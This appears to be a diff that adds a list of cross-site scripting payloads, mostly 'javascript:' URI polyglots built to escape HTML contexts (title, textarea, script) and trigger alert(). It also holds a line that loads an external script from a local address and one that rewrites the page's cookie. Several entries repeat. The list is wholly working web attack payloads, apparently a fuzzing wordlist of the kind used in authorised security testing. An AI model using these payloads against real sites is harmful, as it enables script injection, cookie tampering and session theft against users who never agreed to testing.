@@ -1,0 +1,24 @@
+javascript:document.scripts[0].src='http://127.0.0.1/yy.js';void(0);
+javascript:document.cookie=window.prompt("edit cookie:",document.cookie);void(0);
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+javascript:alert(1)//INJECTX
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
